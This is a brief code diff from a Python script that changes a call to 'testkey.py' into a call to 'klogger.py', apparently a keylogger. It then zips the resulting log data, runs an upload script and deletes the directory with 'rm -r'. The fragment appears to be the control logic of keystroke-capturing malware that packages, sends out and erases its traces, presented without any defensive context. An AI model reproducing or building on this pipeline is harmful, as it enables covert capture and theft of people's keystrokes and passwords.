@@ -15,7 +15,7 @@ os.system('rm wd.txt')
 
 directory = wd2 + directory
 
-os.system('python testkey.py')
+os.system('python klogger.py')
 os.system('zip -rj ' + directory + '/logdata.zip ' + directory)
 os.system('python upload_db.py')
 os.system('rm -r ' + directory)
